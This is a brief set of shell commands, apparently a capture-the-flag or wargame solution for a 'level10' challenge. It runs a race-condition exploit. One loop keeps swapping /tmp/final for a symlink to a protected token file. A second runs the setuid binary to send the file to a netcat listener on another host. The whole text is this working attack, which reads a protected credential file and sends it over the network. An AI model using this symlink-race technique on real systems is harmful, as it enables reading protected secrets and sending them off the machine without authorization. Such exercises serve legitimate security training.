First ssh terminal: `while true; do (./level10 /tmp/final 10.11.200.134); done`

Second ssh terminal: `while true; do nc -l 6969 ;done`

third ssh terminal: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done`